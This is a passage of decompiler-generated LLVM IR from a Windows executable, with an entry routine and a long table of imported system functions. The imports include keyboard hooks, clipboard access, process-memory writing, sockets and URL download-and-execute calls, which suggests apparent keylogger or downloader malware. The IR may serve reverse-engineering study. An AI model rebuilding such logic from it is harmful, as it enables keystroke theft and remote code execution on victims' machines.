  %94 = add i8 %91, %93, !insn.addr !2138
  store i8 %94, i8* %90, align 1, !insn.addr !2138
  ret i32 %88, !insn.addr !2138

dec_label_pc_407a2d:                              ; preds = %dec_label_pc_407991
  %95 = add i32 %46, 1, !insn.addr !2139
  store i32 %95, i32* %eax, align 4, !insn.addr !2139
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2140
  %97 = load i8, i8* %96, align 1, !insn.addr !2140
  %98 = udiv i32 %arg3, 256, !insn.addr !2140
  %99 = trunc i32 %98 to i8, !insn.addr !2140
  %100 = add i8 %97, %99, !insn.addr !2140
  store i8 %100, i8* %96, align 1, !insn.addr !2140
  %101 = add i32 %arg3, 89, !insn.addr !2141
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2141
  store i8 -1, i8* %102, align 1, !insn.addr !2141
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2142
  %103 = load i32, i32* %eax, align 4, !insn.addr !2143
  ret i32 %103, !insn.addr !2143

dec_label_pc_407a45:                              ; preds = %dec_label_pc_4079c4
  %104 = load i32, i32* %eax, align 4, !insn.addr !2144
  ret i32 %104, !insn.addr !2144
}

define i32 @function_407a48() local_unnamed_addr {
dec_label_pc_407a48:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2145
  %2 = add i32 %1, -1, !insn.addr !2145
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2145
  ret i32 %0, !insn.addr !2146
}

define i32 @function_407a50() local_unnamed_addr {
dec_label_pc_407a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2147
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a7b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2148
  ret i32 %0, !insn.addr !2148
}

define i32 @function_407a80() local_unnamed_addr {
dec_label_pc_407a80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2149
}

define i32 @function_407a82(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2150
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b7c:
  %esp.2.reg2mem = alloca i32, !insn.addr !2151
  %esp.1.reg2mem = alloca i32, !insn.addr !2151
  %esp.0.reg2mem = alloca i32, !insn.addr !2151
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2152
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2153
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2153
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2153
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2154
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2155
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 0), !insn.addr !2156
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2157
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2157
  store i8 0, i8* %6, align 1, !insn.addr !2157
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2158
  %8 = call i32 @function_407008(), !insn.addr !2159
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2160
  %10 = call i32 @function_407080(), !insn.addr !2161
  %11 = trunc i32 %10 to i8, !insn.addr !2162
  %12 = icmp eq i8 %11, 0, !insn.addr !2162
  br i1 %12, label %dec_label_pc_407c83, label %dec_label_pc_407c08, !insn.addr !2163

dec_label_pc_407c08:                              ; preds = %dec_label_pc_407b7c
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2164
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2165
  store i32 -1, i32* %14, align 4, !insn.addr !2165
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2166
  %16 = call i32 @function_407048(), !insn.addr !2167
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2168
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2169
  %19 = call i32 @function_4036c8(), !insn.addr !2170
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2171
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2172
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2173
  %23 = call i32 @function_4036c8(), !insn.addr !2174
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2175
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2175
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2175
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2176
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2176
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2177
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2178
  br label %dec_label_pc_407cb0, !insn.addr !2178

dec_label_pc_407c83:                              ; preds = %dec_label_pc_407b7c
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2155
  %29 = call i32 @function_4060f0(), !insn.addr !2179
  %30 = call i32 @function_407080(), !insn.addr !2180
  %31 = trunc i32 %30 to i8, !insn.addr !2181
  %32 = icmp eq i8 %31, 0, !insn.addr !2181
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2182
  br i1 %32, label %dec_label_pc_407df2, label %dec_label_pc_407ca5, !insn.addr !2182

dec_label_pc_407ca5:                              ; preds = %dec_label_pc_407c83
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2183
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2184
  store i32 -1, i32* %34, align 4, !insn.addr !2184
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2184
  br label %dec_label_pc_407cb0, !insn.addr !2184

dec_label_pc_407cb0:                              ; preds = %dec_label_pc_407ca5, %dec_label_pc_407c08
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2185
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2185
  store i32 260, i32* %36, align 4, !insn.addr !2185
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2186
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2186
  store i32 ptrtoint (i8** @global_var_4096f8 to i32), i32* %38, align 4, !insn.addr !2186
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2187
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2187
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2188
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2188
  store i32 %40, i32* %42, align 4, !insn.addr !2188
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2189
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2190
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2190
  store i8 0, i8* %45, align 1, !insn.addr !2190
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2191
  %47 = call i32 @function_407048(), !insn.addr !2192
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2193
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2194
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2195
  %51 = icmp eq i32 %50, 0, !insn.addr !2195
  br i1 %51, label %dec_label_pc_407d49, label %dec_label_pc_407d16, !insn.addr !2196

dec_label_pc_407d16:                              ; preds = %dec_label_pc_407cb0
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2197
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2197
  store i32 ptrtoint ([16 x i8]* @global_var_407e74 to i32), i32* %53, align 4, !insn.addr !2197
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2198
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2198
  store i32 ptrtoint ([8 x i8]* @global_var_407e84 to i32), i32* %55, align 4, !insn.addr !2198
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2199
  %57 = icmp eq i32* %56, null, !insn.addr !2200
  %58 = icmp eq i1 %57, false, !insn.addr !2201
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2201
  br i1 %58, label %dec_label_pc_407df2, label %dec_label_pc_407d2d, !insn.addr !2201

dec_label_pc_407d2d:                              ; preds = %dec_label_pc_407d16
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2202
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2202
  store i32 ptrtoint (i32* @global_var_409808 to i32), i32* %60, align 4, !insn.addr !2202
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2203
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2203
  store i32 0, i32* %62, align 4, !insn.addr !2203
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2204
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2204
  store i32 66, i32* %64, align 4, !insn.addr !2204
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2205
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2205
  store i32 4220648, i32* %66, align 4, !insn.addr !2205
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2206
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2206
  store i32 0, i32* %68, align 4, !insn.addr !2206
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2207
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2207
  store i32 0, i32* %70, align 4, !insn.addr !2207
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2208
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2209
  br label %dec_label_pc_407df2, !insn.addr !2209

dec_label_pc_407d49:                              ; preds = %dec_label_pc_407cb0
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2210
  %73 = icmp eq i32 %72, 0, !insn.addr !2210
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2211
  br i1 %73, label %dec_label_pc_407df2, label %dec_label_pc_407d57, !insn.addr !2211

dec_label_pc_407d57:                              ; preds = %dec_label_pc_407d49
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2212
  %75 = icmp eq i8 %74, 0, !insn.addr !2212
  br i1 %75, label %dec_label_pc_407d66, label %dec_label_pc_407d61, !insn.addr !2213

dec_label_pc_407d61:                              ; preds = %dec_label_pc_407d57
  %76 = call i32 @function_4068a8(), !insn.addr !2214
  br label %dec_label_pc_407d66, !insn.addr !2214

dec_label_pc_407d66:                              ; preds = %dec_label_pc_407d61, %dec_label_pc_407d57
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2215
  %78 = icmp slt i32 %77, 1, !insn.addr !2216
  br i1 %78, label %dec_label_pc_407da3, label %dec_label_pc_407d70, !insn.addr !2216

dec_label_pc_407d70:                              ; preds = %dec_label_pc_407d66
  %79 = call i32 @function_404d38(), !insn.addr !2217
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2218
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2219
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2220
  store i32 -1, i32* %82, align 4, !insn.addr !2220
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2221
  %84 = icmp eq i32 %83, 0, !insn.addr !2221
  br i1 %84, label %dec_label_pc_407da3, label %dec_label_pc_407d9e, !insn.addr !2222

dec_label_pc_407d9e:                              ; preds = %dec_label_pc_407d70
  %85 = call i32 @function_40600c(), !insn.addr !2223
  br label %dec_label_pc_407da3, !insn.addr !2223

dec_label_pc_407da3:                              ; preds = %dec_label_pc_407d9e, %dec_label_pc_407d70, %dec_label_pc_407d66
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2224
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2224
  store i32 3, i32* %87, align 4, !insn.addr !2224
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2225
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2225
  store i32 16065, i32* %89, align 4, !insn.addr !2225
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2226
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2227
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2227
  store i32 %90, i32* %92, align 4, !insn.addr !2227
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2228
  %94 = icmp eq i32* %93, null, !insn.addr !2229
  %95 = icmp eq i1 %94, false, !insn.addr !2230
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2230
  br i1 %95, label %dec_label_pc_407de3, label %dec_label_pc_407db9, !insn.addr !2230

dec_label_pc_407db9:                              ; preds = %dec_label_pc_407da3
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2231
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2231
  store i32 14, i32* %97, align 4, !insn.addr !2231
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2232
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2232
  store i32 16065, i32* %99, align 4, !insn.addr !2232
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2233
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2234
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2234
  store i32 %100, i32* %102, align 4, !insn.addr !2234
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2235
  %104 = icmp eq i32* %103, null, !insn.addr !2236
  %105 = icmp eq i1 %104, false, !insn.addr !2237
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2237
  br i1 %105, label %dec_label_pc_407de3, label %dec_label_pc_407dcf, !insn.addr !2237

dec_label_pc_407dcf:                              ; preds = %dec_label_pc_407db9
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2238
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2238
  store i32 16065, i32* %107, align 4, !insn.addr !2238
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2239
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2240
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2240
  store i32 %108, i32* %110, align 4, !insn.addr !2240
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2241
  %112 = icmp eq i32* %111, null, !insn.addr !2242
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2243
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2243
  br i1 %112, label %dec_label_pc_407df2, label %dec_label_pc_407de3, !insn.addr !2243

dec_label_pc_407de3:                              ; preds = %dec_label_pc_407dcf, %dec_label_pc_407db9, %dec_label_pc_407da3
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_40791c(), !insn.addr !2244
  store i32 4225616, i32* @global_var_409654, align 4, !insn.addr !2245
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2245
  br label %dec_label_pc_407df2, !insn.addr !2245

dec_label_pc_407df2:                              ; preds = %dec_label_pc_407de3, %dec_label_pc_407dcf, %dec_label_pc_407d49, %dec_label_pc_407d2d, %dec_label_pc_407d16, %dec_label_pc_407c83
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2246
  %115 = load i32, i32* %114, align 4, !insn.addr !2246
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2247
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2248
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2248
  store i32 4226580, i32* %117, align 4, !insn.addr !2248
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2249
  ret i32 %118, !insn.addr !2250
}

define i32 @function_407e0d() local_unnamed_addr {
dec_label_pc_407e0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2251
  ret i32 %0, !insn.addr !2251
}

define i32 @function_407e12() local_unnamed_addr {
dec_label_pc_407e12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2252
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_out(i32, i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
!73 = !{i64 4207815}
!74 = !{i64 4207816}
!75 = !{i64 4207818}
!76 = !{i64 4207820}
!77 = !{i64 4207823}
!78 = !{i64 4208007}
!79 = !{i64 4208145}
!80 = !{i64 4208312}
!81 = !{i64 4208314}
!82 = !{i64 4208316}
!83 = !{i64 4208319}
!84 = !{i64 4208320}
!85 = !{i64 4208322}
!86 = !{i64 4208326}
!87 = !{i64 4208328}
!88 = !{i64 4208332}
!89 = !{i64 4208408}
!90 = !{i64 4208413}
!91 = !{i64 4208416}
!92 = !{i64 4208421}
!93 = !{i64 4208487}
!94 = !{i64 4208831}
!95 = !{i64 4209003}
!96 = !{i64 4209263}
!97 = !{i64 4209790}
!98 = !{i64 4209799}
!99 = !{i64 4209800}
!100 = !{i64 4209802}
!101 = !{i64 4209804}
!102 = !{i64 4209807}
!103 = !{i64 4209808}
!104 = !{i64 4209813}
!105 = !{i64 4209814}
!106 = !{i64 4209832}
!107 = !{i64 4209837}
!108 = !{i64 4209840}
!109 = !{i64 4209845}
!110 = !{i64 4210564}
!111 = !{i64 4210569}
!112 = !{i64 4210573}
!113 = !{i64 4210746}
!114 = !{i64 4210751}
!115 = !{i64 4210759}
!116 = !{i64 4210834}
!117 = !{i64 4210839}
!118 = !{i64 4210842}
!119 = !{i64 4211056}
!120 = !{i64 4211064}
!121 = !{i64 4211072}
!122 = !{i64 4211080}
!123 = !{i64 4211088}
!124 = !{i64 4211096}
!125 = !{i64 4211121}
!126 = !{i64 4211381}
!127 = !{i64 4211386}
!128 = !{i64 4211471}
!129 = !{i64 4211474}
!130 = !{i64 4211477}
!131 = !{i64 4211485}
!132 = !{i64 4211488}
!133 = !{i64 4211496}
